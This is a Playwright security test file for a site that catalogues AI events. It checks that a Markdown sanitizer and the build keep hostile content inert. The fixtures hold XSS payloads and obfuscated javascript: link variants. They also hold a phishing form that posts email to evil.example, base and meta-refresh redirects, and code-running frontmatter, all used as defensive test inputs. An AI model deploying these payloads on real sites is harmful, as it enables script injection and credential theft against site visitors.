import { test, expect, type Page } from '@playwright/test';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { marked } from 'marked';
import { renderMarkdown } from '../src/lib/markdown';

/**
 * Hostile content must stay inert. The first group builds the real pages from
 * throwaway content (nothing here lives under /content), so a passing run proves
 * what a reader's browser does with them.
 */

const SITE_DIR = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const REPO_ROOT = path.resolve(SITE_DIR, '..');

const BREAKOUT_TITLE = 'PoC title </SCRIPT><SCRIPT>window.__poc_title_breakout=1</SCRIPT> "quoted" & <b>tagged</b>';

const HOSTILE_BODY = `## Summary

Summary with an inline script <img src="x" onerror="window.__poc_img_onerror=1"> in it.

## What Happened

<script>window.__poc_body_script=1</script>

<iframe id="poc-iframe" srcdoc="<b>framed</b>"></iframe>

<form id="poc-form" action="https://evil.example/collect"><input name="email" placeholder="Re-enter your email"></form>

[markdown javascript link](javascript:window.__poc_md_link=1)

[markdown entity link](javascript&colon;window.__poc_entity_link=1)

[markdown external link](https://evil.example/)

<a id="poc-raw-a" href="javascript:window.__poc_raw_a=1" target="_self">raw anchor</a>

Raw text mode <code><img id="poc-raw-text" src=x onerror=window.__poc_raw_text=1 y</code> bypass.

## Why It Matters

<style>body{background:red !important}</style>
`;

const FIXTURE_FILES: Record<string, string> = {
  'events/2026/01-poc-event.md': `---
id: zz-poc-event
title: ${JSON.stringify(BREAKOUT_TITLE)}
date: 2026-10-01
category: safety
significance: landmark
confidence: medium
actors:
  - id: zz-poc-actor
    role: subject
threads:
  - zz-poc-thread
sources:
  - url: https://example.com/poc
    title: First source
    type: official
    archive_url: https://example.com/poc-arc
---

${HOSTILE_BODY}`,
  'events/2026/02-rce-poc.md': `---js
(function () {
  require('fs').appendFileSync(process.env.POC_MARKER, 'ran');
  return { id: 'zz-rce-poc', title: 'Looks like a normal event', date: '2026-10-02', category: 'safety', significance: 'landmark', sources: [{ url: 'https://example.com/a', title: 'a' }] };
})()
---

## Summary

Body.
`,
  'threads/zz-poc-thread.md': `---
id: zz-poc-thread
title: ${JSON.stringify(BREAKOUT_TITLE)}
status: active
started: 2026-10-01
core_question: Does hostile content stay inert?
curator: Curator
events:
  - zz-poc-event
---

${HOSTILE_BODY}`,
  'controversies/zz-poc-controversy.md': `---
id: zz-poc-controversy
title: ${JSON.stringify(BREAKOUT_TITLE)}
thread: zz-poc-thread
status: active
polarity: binary
positions:
  - claim: First claim
    sources:
      - url: https://example.com/position
        title: Position source
  - claim: Second claim
---

${HOSTILE_BODY}`,
  'actors/zz-poc-actor.yml': 'id: zz-poc-actor\nname: PoC actor\ntype: company\nwebsite: https://example.com/\n',
};

const SAFE_PROTOCOLS = ['http:', 'https:', 'mailto:'];

const CONTENT_TYPES: Record<string, string> = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css',
  '.js': 'text/javascript',
  '.svg': 'image/svg+xml',
  '.woff2': 'font/woff2',
};

async function pageState(page: Page) {
  return page.evaluate(() => {
    const w = window as unknown as Record<string, unknown>;
    return {
      markers: Object.keys(w).filter((key) => key.startsWith('__poc')),
      background: getComputedStyle(document.body).backgroundColor,
      liveElements: document.querySelectorAll('#poc-iframe, #poc-form, #poc-raw-a, #poc-raw-text, iframe').length,
      handlers: [...document.querySelectorAll('*')].flatMap((el) =>
        [...el.attributes].filter((attr) => /^on/i.test(attr.name)).map((attr) => `${el.tagName}[${attr.name}]`),
      ),
      protocols: [...new Set([...document.querySelectorAll<HTMLAnchorElement>('a[href]')].map((a) => a.protocol))],
      bodyText: document.body.textContent ?? '',
    };
  });
}

async function expectInert(page: Page) {
  const state = await pageState(page);
  expect(state.markers).toEqual([]);
  expect(state.background).toBe('rgb(250, 250, 247)');
  expect(state.liveElements).toBe(0);
  expect(state.handlers).toEqual([]);
  expect(state.protocols.filter((protocol) => !SAFE_PROTOCOLS.includes(protocol))).toEqual([]);
  return state;
}

// Replace the analytics stub with a recorder and stop clicks from navigating away.
async function recordAnalytics(page: Page) {
  await page.evaluate(() => {
    const w = window as unknown as { __captured: unknown[]; posthog: { capture: unknown } };
    w.__captured = [];
    w.posthog.capture = (name: string, props: unknown) => w.__captured.push({ name, props });
    document.addEventListener('click', (event) => event.preventDefault());
  });
}

function capturedAfterClick(page: Page, selector: string) {
  return page.evaluate((target) => {
    const w = window as unknown as { __captured: unknown[] };
    w.__captured.length = 0;
    document.querySelector<HTMLElement>(target)!.click();
    return w.__captured;
  }, selector);
}

test.describe('built pages with hostile content', () => {
  test.describe.configure({ mode: 'default' });

  let tempDir = '';
  let markerFile = '';
  let server: http.Server | undefined;
  let origin = '';
  let pageErrors: string[] = [];

  test.beforeAll(async ({}, testInfo) => {
    if (testInfo.project.name === 'mobile') return;
    testInfo.setTimeout(300_000);

    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ledger-security-'));
    markerFile = path.join(tempDir, 'rce-marker');
    const contentDir = path.join(tempDir, 'content');
    for (const [relative, body] of Object.entries(FIXTURE_FILES)) {
      const target = path.join(contentDir, relative);
      fs.mkdirSync(path.dirname(target), { recursive: true });
      fs.writeFileSync(target, body);
    }

    const distDir = path.join(tempDir, 'dist');
    execFileSync('npx', ['astro', 'build', '--outDir', distDir], {
      cwd: SITE_DIR,
      env: { ...process.env, CONTENT_DIR: contentDir, POC_MARKER: markerFile },
      stdio: 'pipe',
    });

    server = http.createServer((req, res) => {
      const pathname = new URL(req.url ?? '/', 'http://localhost').pathname;
      const extension = path.extname(pathname);
      const file = path.join(distDir, pathname, extension ? '' : 'index.html');
      if (!file.startsWith(distDir) || !fs.existsSync(file)) {
        res.writeHead(404).end();
        return;
      }
      res.writeHead(200, { 'content-type': CONTENT_TYPES[extension] ?? CONTENT_TYPES['.html'] }).end(fs.readFileSync(file));
    });
    await new Promise<void>((resolve) => server!.listen(0, '127.0.0.1', resolve));
    origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  });

  test.afterAll(async () => {
    server?.closeAllConnections();
    await new Promise((resolve) => (server ? server.close(resolve) : resolve(undefined)));
    if (tempDir) fs.rmSync(tempDir, { recursive: true, force: true });
  });

  test.beforeEach(async ({ page }, testInfo) => {
    test.skip(testInfo.project.name === 'mobile', 'desktop only');
    pageErrors = [];
    page.on('pageerror', (error) => pageErrors.push(error.message));
  });

  test('the site build does not run code frontmatter or publish that file', async ({ request }) => {
    expect(fs.existsSync(markerFile)).toBe(false);
    expect((await request.get(`${origin}/events/zz-rce-poc`)).status()).toBe(404);
    expect((await request.get(`${origin}/events/zz-poc-event`)).status()).toBe(200);
  });

  for (const route of ['/events/zz-poc-event', '/threads/zz-poc-thread', '/controversies/zz-poc-controversy']) {
    test(`${route} shows hostile markup as text and runs none of it`, async ({ page }) => {
      await page.goto(origin + route);
      const { bodyText } = await expectInert(page);

      expect(bodyText).toContain('<script>window.__poc_body_script=1</script>');
      expect(bodyText).toContain('onerror="window.__poc_img_onerror=1"');
      expect(bodyText).toContain('markdown javascript link');
      expect(bodyText).toContain('markdown entity link');
      await expect(page.locator('a[href="https://evil.example/"]')).toHaveText('markdown external link');
      expect(pageErrors).toEqual([]);
    });
  }

  test('event analytics still report the exact title', async ({ page }) => {
    await page.goto(`${origin}/events/zz-poc-event`);
    await recordAnalytics(page);

    expect(await capturedAfterClick(page, '.wiki-article__references a[target="_blank"]:not(.ref-archive)')).toEqual([
      {
        name: 'source_link_clicked',
        props: {
          event_id: 'zz-poc-event',
          event_title: BREAKOUT_TITLE,
          event_category: 'safety',
          source_title: 'First source',
        },
      },
    ]);
    expect(await capturedAfterClick(page, 'a.ref-archive')).toEqual([
      { name: 'archive_link_clicked', props: { event_id: 'zz-poc-event', event_title: BREAKOUT_TITLE } },
    ]);
    expect(pageErrors).toEqual([]);
  });

  test('controversy analytics still report the exact title', async ({ page }) => {
    await page.goto(`${origin}/controversies/zz-poc-controversy`);
    await recordAnalytics(page);

    expect(await capturedAfterClick(page, '.position__sources a[target="_blank"]')).toEqual([
      {
        name: 'controversy_source_clicked',
        props: {
          controversy_id: 'zz-poc-controversy',
          controversy_title: BREAKOUT_TITLE,
          source_title: 'Position source',
        },
      },
    ]);
    expect(pageErrors).toEqual([]);
  });

  test('the home page carries a hostile featured title safely', async ({ page }) => {
    await page.goto(`${origin}/`);
    await expectInert(page);
    await recordAnalytics(page);

    expect(await capturedAfterClick(page, 'a[href="/events/zz-poc-event"]')).toEqual([
      { name: 'featured_entry_clicked', props: { event_slug: 'zz-poc-event', event_title: BREAKOUT_TITLE } },
    ]);
    expect(pageErrors).toEqual([]);
  });
});

test.describe('rendered Markdown', () => {
  test.beforeEach(({}, testInfo) => {
    test.skip(testInfo.project.name === 'mobile', 'desktop only');
  });

  // Each one is live under plain marked or a renderer that only escapes html tokens.
  const PAYLOADS: Array<[name: string, markdown: string]> = [
    ['script tag', '<script>window.__poc=1</script>'],
    ['event handler', 'x <img src="x" onerror="window.__poc=1"> y'],
    ['svg handler', '<svg onload="window.__poc=1"></svg>'],
    ['details handler', '<details open ontoggle="window.__poc=1">x</details>'],
    ['style tag', '<style>body{background:red !important}</style>'],
    ['iframe', '<iframe id="poc" srcdoc="<script>parent.__poc=1</script>"></iframe>'],
    ['form', '<form id="poc" action="https://evil.example/"><input name="email"></form>'],
    ['base tag', '<base href="https://evil.example/">'],
    ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example/">'],
    ['html comment', '<!-- hidden --><script>window.__poc=1</script>'],
    ['unclosed tag', '<img src=x onerror=window.__poc=1 '],
    ['raw text after inline code', 'a <code><img src=x onerror=window.__poc=1 y</code> b'],
    ['raw text after inline kbd', 'x <kbd><svg onload=window.__poc=1 </kbd>'],
    ['raw text after inline pre', 'x <pre><img src=x onerror=window.__poc=1 y</pre>'],
    ['raw text inside a list', '- a <code><img src=x onerror=window.__poc=1 y</code>'],
    ['raw text inside a table', '| a |\n|---|\n| <code><img src=x onerror=window.__poc=1 y</code> |'],
  ];

  const UNSAFE_LINKS: Array<[name: string, markdown: string]> = [
    ['javascript link', '[click](javascript:window.__poc=1)'],
    ['mixed case scheme', '[click](JaVaScRiPt:window.__poc=1)'],
    ['tab in the scheme', '[click](<java\tscript:window.__poc=1>)'],
    ['named reference in the scheme', '[click](javascript&colon;window.__poc=1)'],
    ['decimal reference in the scheme', '[click](&#106;avascript:window.__poc=1)'],
    ['hex reference in the scheme', '[click](&#x6A;avascript:window.__poc=1)'],
    ['tab reference in the scheme', '[click](java&Tab;script:window.__poc=1)'],
    ['leading reference', '[click](&#32;javascript:window.__poc=1)'],
    ['reference-style link', '[click][a]\n\n[a]: javascript:window.__poc=1'],
    ['autolink', '<javascript:window.__poc=1>'],
    ['data link', '[click](data:text/html,x)'],
    ['vbscript link', '[click](vbscript:x)'],
    ['file link', '[click](file:///etc/passwd)'],
  ];

  async function showRendered(page: Page, markdown: string) {
    await page.setContent(`<!doctype html><body style="background:rgb(250, 250, 247)"><main>${renderMarkdown(markdown)}</main></body>`);
    return page.evaluate(() => ({
      ran: (window as unknown as { __poc?: number }).__poc ?? null,
      background: getComputedStyle(document.body).backgroundColor,
      elements: [...document.querySelectorAll('main *')].map((el) => el.tagName),
      handlers: [...document.querySelectorAll('main *')].flatMap((el) =>
        [...el.attributes].map((attr) => attr.name).filter((name) => /^on/i.test(name)),
      ),
      hrefs: [...document.querySelectorAll<HTMLAnchorElement>('main a')].map((a) => a.protocol),
    }));
  }

  const FORMATTING_TAGS = new Set(['P', 'UL', 'LI', 'TABLE', 'THEAD', 'TBODY', 'TR', 'TH', 'TD', 'A']);

  for (const [name, markdown] of PAYLOADS) {
    test(`inert: ${name}`, async ({ page }) => {
      const result = await showRendered(page, markdown);
      expect(result.ran).toBeNull();
      expect(result.background).toBe('rgb(250, 250, 247)');
      expect(result.elements.filter((tag) => !FORMATTING_TAGS.has(tag))).toEqual([]);
      expect(result.handlers).toEqual([]);
    });
  }

  for (const [name, markdown] of UNSAFE_LINKS) {
    test(`no link: ${name}`, async ({ page }) => {
      const result = await showRendered(page, markdown);
      expect(result.ran).toBeNull();
      expect(result.hrefs).toEqual([]);
    });
  }

  test('images render as their alt text', async ({ page }) => {
    const result = await showRendered(page, '![alt <b>](https://evil.example/x.png "t")');
    expect(result.elements).toEqual(['P']);
    await expect(page.locator('main')).toHaveText('alt <b>');
  });

  // Every formatting feature the content uses today, plus the rest of Markdown's
  // ordinary output. Anything the sanitizer changes here is a regression.
  const LEGITIMATE_MARKDOWN = `## Heading with *emphasis* and \`code\`

A paragraph with **bold**, *italic*, ~~struck~~, AT&T, 3 < 5 and 7 > 2, "quotes" and 'apostrophes'.

Links: [plain](https://example.com/a), [titled](https://example.com/b "A title"), [query](https://example.com/?x=1&y=2), [entity query](https://example.com/?x=1&amp;y=2), [fragment](https://example.com/#a&b), [relative](/events/gpt-4-release), [anchor](#summary), [insecure](http://example.com/), [mail](mailto:editor@example.com), <https://example.com/auto>, https://example.com/bare and editor@example.com.

[Reference link][ref]

[ref]: https://example.com/ref "Reference"

- A list item
- Another with [a link](https://example.com/c)
  - Nested

1. Ordered
2. Items

- [x] Done
- [ ] Open

> A blockquote with **bold**.

| Column | Value |
|--------|:-----:|
| *a*    | 1     |

\`\`\`ts
const generic: Array<string> = ["<kept as code>"];
\`\`\`

Inline \`<script>alert(1)</script>\` as code.

---

Line one
line two
`;

  test('legitimate Markdown renders byte for byte like plain marked', () => {
    expect(renderMarkdown(LEGITIMATE_MARKDOWN)).toBe(marked.parse(LEGITIMATE_MARKDOWN, { async: false }));
  });

  test('every real content body renders byte for byte like plain marked', () => {
    const contentDir = path.join(REPO_ROOT, 'content');
    const bodies = fs
      .readdirSync(contentDir, { recursive: true, encoding: 'utf-8' })
      .filter((entry) => entry.endsWith('.md'))
      .map((entry) => fs.readFileSync(path.join(contentDir, entry), 'utf-8').replace(/^---\n[\s\S]*?\n---\n/, ''));
    expect(bodies.length).toBeGreaterThan(300);
    for (const body of bodies) {
      expect(renderMarkdown(body)).toBe(marked.parse(body, { async: false }));
    }
  });
});

test.describe('guards outside the browser', () => {
  test.beforeEach(({}, testInfo) => {
    test.skip(testInfo.project.name === 'mobile', 'desktop only');
  });

  // CI reaches this file through Playwright, so this keeps the frontmatter and
  // schema proofs on the required path too.
  test('the root content security suite passes', () => {
    test.setTimeout(240_000);
    execFileSync('npm', ['run', 'test:security'], { cwd: REPO_ROOT, stdio: 'pipe' });
  });
});
